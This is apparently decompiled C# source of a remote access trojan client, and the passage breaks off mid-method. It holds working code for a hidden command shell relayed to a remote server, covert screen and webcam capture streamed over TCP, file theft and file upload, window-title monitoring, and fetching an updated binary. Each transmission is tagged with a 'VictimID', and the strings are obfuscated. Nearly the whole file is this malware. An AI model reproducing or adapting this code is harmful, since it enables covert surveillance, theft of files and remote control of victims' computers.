using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Compatibility.VB6;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;

namespace ns1;

[StandardModule]
internal sealed class Module1
{
	public class AktuellesFensterauslesen
	{
		public delegate void NeuesFensterEventHandler(string Titel);

		private NeuesFensterEventHandler NeuesFensterEvent;

		private Thread t;

		public event NeuesFensterEventHandler NeuesFenster
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				NeuesFensterEvent = (NeuesFensterEventHandler)Delegate.Combine(NeuesFensterEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				NeuesFensterEvent = (NeuesFensterEventHandler)Delegate.Remove(NeuesFensterEvent, value);
			}
		}

		[DebuggerNonUserCode]
		public AktuellesFensterauslesen()
		{
		}

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetForegroundWindow();

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

		public string GetActiveWindowTitle()
		{
			string lpString = new string('\0', 100);
			GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
			return lpString.Substring(0, checked(Strings.InStr(lpString, GClass0.smethod_0("\u0001"), (CompareMethod)0) - 1));
		}

		public void Start()
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0008;
					case 99:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_0022;
							case 4:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 5:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0022:
						num = 3;
						t.IsBackground = true;
						break;
						IL_0008:
						num = 2;
						t = new Thread(AktuellesFensterAuslesen);
						goto IL_0022;
						end_IL_0000_2:
						break;
					}
					num = 4;
					t.Start();
					break;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 99;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_3:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		public void Stopp()
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						break;
					case 51:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 3:
								goto end_IL_0000_3;
							}
							goto default;
						}
						end_IL_0000_2:
						break;
					}
					num = 2;
					t.Abort();
					break;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 51;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_3:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		private void AktuellesFensterAuslesen()
		{
			string text = GetActiveWindowTitle();
			while (true)
			{
				string activeWindowTitle = GetActiveWindowTitle();
				if (Operators.CompareString(text, activeWindowTitle, false) != 0)
				{
					NeuesFensterEvent?.Invoke(activeWindowTitle);
					text = activeWindowTitle;
				}
				Thread.Sleep(500);
			}
		}
	}

	public class ShellKonsole
	{
		public delegate void ShellAnswerEventHandler(string sText);

		private ShellAnswerEventHandler ShellAnswerEvent;

		private Process CMDProzess;

		private Thread thread_0;

		public event ShellAnswerEventHandler ShellAnswer
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				ShellAnswerEvent = (ShellAnswerEventHandler)Delegate.Combine(ShellAnswerEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				ShellAnswerEvent = (ShellAnswerEventHandler)Delegate.Remove(ShellAnswerEvent, value);
			}
		}

		[DebuggerNonUserCode]
		public ShellKonsole()
		{
		}

		public void Start()
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0008;
					case 312:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_0015;
							case 4:
								goto IL_0031;
							case 5:
								goto IL_0044;
							case 6:
								goto IL_0057;
							case 7:
								goto IL_006a;
							case 8:
								goto IL_007d;
							case 9:
								goto IL_0090;
							case 10:
								goto IL_00a4;
							case 11:
								goto IL_00b3;
							case 12:
								goto IL_00ce;
							case 13:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 14:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_00ce:
						num = 12;
						thread_0.IsBackground = true;
						break;
						IL_00b3:
						num = 11;
						thread_0 = new Thread(method_0);
						goto IL_00ce;
						IL_0008:
						num = 2;
						CMDProzess = new Process();
						goto IL_0015;
						IL_0015:
						num = 3;
						CMDProzess.StartInfo.FileName = GClass0.smethod_0("`ůɥ");
						goto IL_0031;
						IL_0031:
						num = 4;
						CMDProzess.StartInfo.Arguments = null;
						goto IL_0044;
						IL_0044:
						num = 5;
						CMDProzess.StartInfo.UseShellExecute = false;
						goto IL_0057;
						IL_0057:
						num = 6;
						CMDProzess.StartInfo.CreateNoWindow = true;
						goto IL_006a;
						IL_006a:
						num = 7;
						CMDProzess.StartInfo.RedirectStandardOutput = true;
						goto IL_007d;
						IL_007d:
						num = 8;
						CMDProzess.StartInfo.RedirectStandardError = true;
						goto IL_0090;
						IL_0090:
						num = 9;
						CMDProzess.StartInfo.RedirectStandardInput = true;
						goto IL_00a4;
						IL_00a4:
						num = 10;
						CMDProzess.Start();
						goto IL_00b3;
						end_IL_0000_2:
						break;
					}
					num = 13;
					thread_0.Start();
					break;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 312;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_3:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		private void method_0()
		{
			while (true)
			{
				try
				{
					string text = CMDProzess.StandardOutput.ReadLine();
					if (Operators.CompareString(text, GClass0.smethod_0(""), false) != 0)
					{
						ShellAnswerEvent?.Invoke(text);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ShellAnswerEvent?.Invoke(GClass0.smethod_0("vŊɆ\u0341щՙ؋܉\u087e\u0942\u0a54\u0b47\u0c4d\u0d4dๆཔ၎ᅸሾ፧ᑩᕩᘺᝊᡰᥲ\u1a7a᭹᱿ᵼṼὢⁿⅣ≫⌭⑭╩♭❬⡪⥵⩩⭦ⱬⵦ\u2e6c⼯"));
					ProjectData.ClearProjectError();
				}
			}
		}

		public void Schreiben(string stext)
		{
			try
			{
				CMDProzess.StandardInput.WriteLine(stext);
				CMDProzess.StandardInput.Flush();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void Stopp()
		{
			try
			{
				CMDProzess.Kill();
				thread_0.Abort();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public class RemoteDesktop
	{
		public int Geschwindigkeit;

		public int int_0;

		private bool IsStreaming;

		public RemoteDesktop()
		{
			Geschwindigkeit = 2000;
			int_0 = 600;
			IsStreaming = false;
		}

		public void Start()
		{
			if (!IsStreaming)
			{
				Thread thread = new Thread(SendImage);
				thread.IsBackground = true;
				thread.Start();
				IsStreaming = true;
			}
		}

		public void Stopp()
		{
			IsStreaming = false;
		}

		private void SendImage()
		{
			try
			{
				TcpClient tcpClient = new TcpClient();
				tcpClient.Connect(Module2._Ipadresse, Module2._TransferPort);
				BinaryWriter binaryWriter = new BinaryWriter(tcpClient.GetStream());
				binaryWriter.Write(GClass0.smethod_0("^Ůɧ\u0366Ѽբ\u0655ݦ\u0876०੧୯"));
				binaryWriter.Write(Module2.VictimID);
				while (IsStreaming)
				{
					Bitmap sourceImage = CaptureScreen();
					byte[] array = Image2ByteArray((Image)(object)PicResizeByWidth((Image)(object)sourceImage, int_0), ImageFormat.get_Jpeg());
					binaryWriter.Write(Module2.VictimID.ToString());
					binaryWriter.Write(array.Length);
					binaryWriter.Write(array);
					Thread.Sleep(Geschwindigkeit);
				}
				binaryWriter.Close();
				tcpClient.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private Bitmap CaptureScreen()
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Expected O, but got Unknown
			Bitmap val = new Bitmap(SystemInformation.get_VirtualScreen().Width, SystemInformation.get_VirtualScreen().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
			val2.Dispose();
			return val;
		}
	}

	public class ImagePreview
	{
		public int int_0;

		private Thread t1;

		private bool IsStreaming;

		public string Pfad;

		public ImagePreview()
		{
			int_0 = 160;
			IsStreaming = false;
		}

		public void StartDesktopCapture()
		{
			try
			{
				t1 = new Thread(SendImage);
				t1.IsBackground = true;
				t1.Start();
				IsStreaming = true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void StoppDesktopCapture()
		{
			try
			{
				IsStreaming = false;
				t1.Abort();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private void SendImage()
		{
			//IL_0043: Unknown result type (might be due to invalid IL or missing references)
			//IL_0053: Expected O, but got Unknown
			try
			{
				TcpClient tcpClient = new TcpClient();
				tcpClient.Connect(Module2._Ipadresse, Module2._TransferPort);
				BinaryWriter binaryWriter = new BinaryWriter(tcpClient.GetStream());
				binaryWriter.Write(GClass0.smethod_0("MŬɼ\u0357ѯզ\u0670ݶ\u0870।"));
				binaryWriter.Write(Module2.VictimID);
				byte[] array = Image2ByteArray((Image)(object)PicResizeByWidth((Image)new Bitmap(Pfad), int_0), ImageFormat.get_Jpeg());
				binaryWriter.Write(array.Length);
				binaryWriter.Write(array);
				binaryWriter.Close();
				tcpClient.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public class RemoteWebcam
	{
		public delegate void _SendImage();

		private const int WS_CHILD = 1073741824;

		private const int WS_VISIBLE = 268435456;

		private const int WM_CAP_DRIVER_CONNECT = 1034;

		private const int WM_CAP_START = 1024;

		private const int WM_CAP_GRAB_FRAME = 1084;

		private const int WM_CAP_SAVEDIB = 1049;

		private const short WM_CAP_DRIVER_DISCONNECT = 1035;

		public int Geschwindigkeit;

		public int int_0;

		private Thread t1;

		private bool IsStreaming;

		public int WebCamID;

		public RemoteWebcam()
		{
			Geschwindigkeit = 2000;
			int_0 = 600;
			IsStreaming = false;
			WebCamID = 0;
		}

		[DllImport("avicap32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool capGetDriverDescriptionA(short wDriverIndex, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

		[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, int dwStyle, int x, int y, int nWidth, short nHeight, int hWndParent, int nID);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SendMessageA(int hwnd, int wMsg, short wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lParam);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern long GetDesktopWindow();

		public bool method_0()
		{
			string lpszName = Strings.Space(80);
			string lpszVer = Strings.Space(80);
			return capGetDriverDescriptionA(0, ref lpszName, 80, ref lpszVer, 80);
		}

		public void Start()
		{
			if (!IsStreaming)
			{
				IsStreaming = true;
				t1 = new Thread(SendImage);
				t1.IsBackground = true;
				t1.Start();
			}
		}

		public void Stopp()
		{
			int try0000_dispatch = -1;
			int num = default(int);
			int num2 = default(int);
			int num3 = default(int);
			int num5 = default(int);
			string text = default(string);
			string[] files = default(string[]);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						num = 1;
						IsStreaming = false;
						goto IL_000a;
					case 159:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_0012;
							case 4:
								goto IL_0032;
							case 5:
								goto IL_004b;
							case 6:
								goto IL_005e;
							case 7:
								goto IL_0062;
							default:
								goto end_IL_0000;
							case 8:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_005e:
						num5 = checked(num5 + 1);
						goto IL_0062;
						IL_004b:
						num = 5;
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
						goto IL_005e;
						IL_000a:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0012;
						IL_0012:
						num = 3;
						files = Directory.GetFiles(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")));
						num5 = 0;
						goto IL_0065;
						IL_0065:
						if (num5 < files.Length)
						{
							text = files[num5];
							goto IL_0032;
						}
						goto end_IL_0000_2;
						IL_0062:
						num = 7;
						goto IL_0065;
						IL_0032:
						num = 4;
						if (Strings.InStr(text, GClass0.smethod_0("xŬɩ\u0362ѥդ"), (CompareMethod)0) != 0)
						{
							goto IL_004b;
						}
						goto IL_005e;
						end_IL_0000:
						break;
					}
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 159;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_2:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		private void SendImage()
		{
			//IL_018c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0193: Expected O, but got Unknown
			//IL_024c: Unknown result type (might be due to invalid IL or missing references)
			if (((Control)MyProject.Forms.Form1).get_InvokeRequired())
			{
				_SendImage sendImage = SendImage;
				((Control)MyProject.Forms.Form1).Invoke((Delegate)sendImage);
				return;
			}
			checked
			{
				try
				{
					TcpClient tcpClient = new TcpClient();
					int num = 0;
					tcpClient.Connect(Module2._Ipadresse, Module2._TransferPort);
					BinaryWriter binaryWriter = new BinaryWriter(tcpClient.GetStream());
					int num2 = 0;
					binaryWriter.Write(GClass0.smethod_0("QŠɦ\u0360ѣլ"));
					binaryWriter.Write(Module2.VictimID);
					bool flag = true;
					string lpszWindowName;
					while (flag)
					{
						try
						{
							lpszWindowName = GClass0.smethod_0("Nŭɻ;Ѽպ٢ݑ\u086c४੧୭\u0c76");
							num2 = capCreateCaptureWindowA(ref lpszWindowName, 0, 0, 0, 0, 0, (int)GetDesktopWindow(), 0);
							flag = false;
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							flag = true;
							ProjectData.ClearProjectError();
						}
					}
					int hwnd = num2;
					short wParam = (short)WebCamID;
					lpszWindowName = Conversions.ToString(0);
					SendMessageA(hwnd, 1034, wParam, ref lpszWindowName);
					while (IsStreaming)
					{
						try
						{
							File.Delete(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("[Ÿɬ\u0369Ѣե٤") + (num - 1));
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						try
						{
							int hwnd2 = num2;
							lpszWindowName = Conversions.ToString(0);
							SendMessageA(hwnd2, 1084, 0, ref lpszWindowName);
							int hwnd3 = num2;
							lpszWindowName = Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("[Ÿɬ\u0369Ѣե٤") + num;
							SendMessageA(hwnd3, 1049, 0, ref lpszWindowName);
							Bitmap sourceImage = new Bitmap(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("[Ÿɬ\u0369Ѣե٤") + num);
							byte[] array = Image2ByteArray((Image)(object)PicResizeByWidth((Image)(object)sourceImage, int_0), ImageFormat.get_Jpeg());
							binaryWriter.Write(Module2.VictimID.ToString());
							binaryWriter.Write(array.Length);
							binaryWriter.Write(array);
							num++;
							Thread.Sleep(Geschwindigkeit);
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
					}
					int hwnd4 = num2;
					short wParam2 = (short)WebCamID;
					lpszWindowName = Conversions.ToString(0);
					SendMessageA(hwnd4, 1035, wParam2, ref lpszWindowName);
					int hwnd5 = num2;
					lpszWindowName = Conversions.ToString(0);
					SendMessageA(hwnd5, 10, 10, ref lpszWindowName);
					binaryWriter.Close();
					tcpClient.Close();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
					ProjectData.ClearProjectError();
				}
			}
		}

		private void ClearImages()
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			int num5 = default(int);
			string text = default(string);
			string[] files = default(string[]);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0008;
					case 145:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_0028;
							case 4:
								goto IL_0041;
							case 5:
								goto IL_0054;
							case 6:
								goto IL_0058;
							default:
								goto end_IL_0000;
							case 7:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_0054:
						num5 = checked(num5 + 1);
						goto IL_0058;
						IL_0041:
						num = 4;
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
						goto IL_0054;
						IL_0008:
						num = 2;
						files = Directory.GetFiles(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")));
						num5 = 0;
						goto IL_005b;
						IL_005b:
						if (num5 < files.Length)
						{
							text = files[num5];
							goto IL_0028;
						}
						goto end_IL_0000_2;
						IL_0058:
						num = 6;
						goto IL_005b;
						IL_0028:
						num = 3;
						if (Strings.InStr(text, GClass0.smethod_0("xŬɩ\u0362ѥդ"), (CompareMethod)0) != 0)
						{
							goto IL_0041;
						}
						goto IL_0054;
						end_IL_0000:
						break;
					}
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 145;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_2:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
	}

	public class ShowDeskInListview
	{
		public int int_0;

		public ShowDeskInListview()
		{
			int_0 = 200;
		}

		public void Start()
		{
			try
			{
				Thread thread = new Thread(SendImage);
				thread.IsBackground = true;
				thread.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private void SendImage()
		{
			try
			{
				TcpClient tcpClient = new TcpClient();
				tcpClient.Connect(Module2._Ipadresse, Module2._TransferPort);
				BinaryWriter binaryWriter = new BinaryWriter(tcpClient.GetStream());
				binaryWriter.Write(GClass0.smethod_0("DŮɵͱѲժ٧ݶ"));
				binaryWriter.Write(Module2.VictimID);
				byte[] array = Image2ByteArray((Image)(object)PicResizeByWidth((Image)(object)CaptureScreen(), int_0), ImageFormat.get_Jpeg());
				binaryWriter.Write(array.Length);
				binaryWriter.Write(array);
				binaryWriter.Close();
				tcpClient.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private Bitmap CaptureScreen()
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Expected O, but got Unknown
			Bitmap val = new Bitmap(SystemInformation.get_VirtualScreen().Width, SystemInformation.get_VirtualScreen().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
			val2.Dispose();
			return val;
		}
	}

	public class ShowSingelScreen
	{
		public int int_0;

		private Thread t1;

		public ShowSingelScreen()
		{
			int_0 = 200;
		}

		public void Start()
		{
			try
			{
				t1 = new Thread(SendImage);
				t1.IsBackground = true;
				t1.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private void SendImage()
		{
			try
			{
				TcpClient tcpClient = new TcpClient();
				tcpClient.Connect(Module2._Ipadresse, Module2._TransferPort);
				BinaryWriter binaryWriter = new BinaryWriter(tcpClient.GetStream());
				binaryWriter.Write(GClass0.smethod_0("Cŧɡͺџբ٤ݮ\u086d६\u0a55୦\u0c76൦\u0e67\u0f6f"));
				binaryWriter.Write(Module2.VictimID);
				byte[] array = Image2ByteArray((Image)(object)PicResizeByWidth((Image)(object)CaptureScreen(), int_0), ImageFormat.get_Jpeg());
				binaryWriter.Write(array.Length);
				binaryWriter.Write(array);
				binaryWriter.Close();
				tcpClient.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private Bitmap CaptureScreen()
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Expected O, but got Unknown
			Bitmap val = new Bitmap(SystemInformation.get_VirtualScreen().Width, SystemInformation.get_VirtualScreen().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
			val2.Dispose();
			return val;
		}
	}

	private struct clienterverParameter
	{
		public string IpAdresse;

		public int Port;

		public TcpClient tcp_c;

		public NetworkStream socketstream;

		public BinaryWriter writer;

		public BinaryReader reader;

		public Thread tthread;
	}

	public class FileSender
	{
		private Thread t1;

		public string VonHier;

		public string NachHier;

		[DebuggerNonUserCode]
		public FileSender()
		{
		}

		public void Start()
		{
			try
			{
				t1 = new Thread(SendFileToServer);
				t1.IsBackground = true;
				t1.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private void SendFileToServer()
		{
			try
			{
				TcpClient tcpClient = new TcpClient();
				tcpClient.Connect(Module2._Ipadresse, Module2._TransferPort);
				BinaryWriter binaryWriter = new BinaryWriter(tcpClient.GetStream());
				byte[] array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllBytes(VonHier);
				binaryWriter.Write(GClass0.smethod_0("Vŵɻ\u0348Ѥՠٮ\u074c\u087b१੪\u0b45౩൭\u0e66ཬၵ"));
				binaryWriter.Write(Module2.VictimID);
				binaryWriter.Write(VonHier);
				binaryWriter.Write(NachHier);
				binaryWriter.Write(array.Length);
				binaryWriter.Write(array);
				binaryWriter.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public class FileGetter
	{
		public struct clienterverParameter
		{
			public string IpAdresse;

			public int Port;

			public TcpClient tcp_c;

			public NetworkStream socketstream;

			public BinaryWriter writer;

			public BinaryReader reader;

			public Thread tthread;
		}

		public string vonhier;

		public string nachhier;

		private Thread t1;

		[DebuggerNonUserCode]
		public FileGetter()
		{
		}

		public void Start()
		{
			try
			{
				t1 = new Thread(GetFileFromServer);
				t1.IsBackground = true;
				t1.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void GetUpdatedServerFromServer()
		{
			try
			{
				Thread thread = new Thread(GetUServerFromServer);
				thread.IsBackground = true;
				thread.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private void GetUServerFromServer()
		{
			try
			{
				TcpClient tcpClient = new TcpClient();
				tcpClient.Connect(Module2._Ipadresse, Module2._TransferPort);
				BinaryReader binaryReader = new BinaryReader(tcpClient.GetStream());
				BinaryWriter binaryWriter = new BinaryWriter(tcpClient.GetStream());
				binaryWriter.Write(GClass0.smethod_0("[Žɨ\u036aѾլ\u064eݵࡩ२\u0a42୪౮\u0d64"));
				binaryWriter.Write(Module2.VictimID);
				binaryWriter.Write(vonhier);
				int count = binaryReader.ReadInt32();
				byte[] buffer = binaryReader.ReadBytes(count);
				FileStream fileStream = new FileStream(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("VűɰͲѶաتݦ\u087a।"), FileMode.Create, FileAccess.Write, FileShare.None);
				fileStream.Write(buffer, 0, count);
				fileStream.Close();
				UpdateFromFile();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private void GetFileFromServer()
		{
			try
			{
				TcpClient tcpClient = new TcpClient();
				tcpClient.Connect(Module2._Ipadresse, Module2._TransferPort);
				BinaryWriter binaryWriter = new BinaryWriter(tcpClient.GetStream());
				BinaryReader binaryReader = new BinaryReader(tcpClient.GetStream());
				binaryWriter.Write(GClass0.smethod_0("@ţɱ\u0342Ѫծ٤"));
				binaryWriter.Write(Module2.VictimID);
				binaryWriter.Write(vonhier);
				binaryWriter.Write(nachhier);
				int count = binaryReader.ReadInt32();
				byte[] buffer = binaryReader.ReadBytes(count);
				FileStream fileStream = new FileStream(nachhier, FileMode.Create, FileAccess.Write, FileShare.None);
				fileStream.Write(buffer, 0, count);
				fileStream.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public class SendImages
	{
		private struct clienterverParameter
		{
			public string IpAdresse;

			public int Port;

			public TcpClient tcp_c;

			public NetworkStream socketstream;

			public BinaryWriter writer;

			public BinaryReader reader;

			public Thread tthread;
		}

		private TcpClient Tcp_Client;

		private Thread t1;

		private bool IsStreaming;

		public string Pfad;

		public SendImages()
		{
			IsStreaming = false;
		}

		public void Start()
		{
			if (!IsStreaming)
			{
				Tcp_Client = new TcpClient();
				Tcp_Client.Connect(Module2._Ipadresse, Module2._TransferPort);
				clienterverParameter clienterverParameter = default(clienterverParameter);
				clienterverParameter.reader = new BinaryReader(Tcp_Client.GetStream());
				clienterverParameter.writer = new BinaryWriter(Tcp_Client.GetStream());
				clienterverParameter.tcp_c = Tcp_Client;
				clienterverParameter.socketstream = Tcp_Client.GetStream();
				t1 = new Thread(delegate(object a0)
				{
					clienterverParameter clienterverParameter2 = default(clienterverParameter);
					SendImage((a0 != null) ? ((clienterverParameter)a0) : clienterverParameter2);
				});
				t1.IsBackground = true;
				t1.Start(clienterverParameter);
			}
		}

		private void SendImage(clienterverParameter parameter)
		{
			//IL_004d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0053: Expected O, but got Unknown
			IsStreaming = true;
			parameter.writer.Write(GClass0.smethod_0("Zŭɩ\u0362ьթ٢ݥࡤ"));
			parameter.writer.Write(Module2.VictimID);
			try
			{
				string[] files = Directory.GetFiles(Pfad);
				foreach (string text in files)
				{
					try
					{
